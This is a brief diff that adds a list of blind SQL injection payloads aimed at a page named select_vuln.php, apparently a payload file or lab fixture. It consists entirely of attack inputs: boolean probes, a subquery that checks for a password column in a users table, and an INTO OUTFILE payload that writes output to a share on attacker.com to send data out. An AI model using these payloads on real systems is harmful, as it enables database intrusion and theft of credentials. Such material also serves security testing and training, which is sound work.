@@ -1,0 +1,5 @@
+/blindsql/select_vuln.php?id=1
+id=1' AND 1=1-- -
+id=1' AND 1=2-- -
+id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')=1-- -
+id=1' INTO OUTFILE '\\\\attacker.com\\share\\leak.txt'-- -
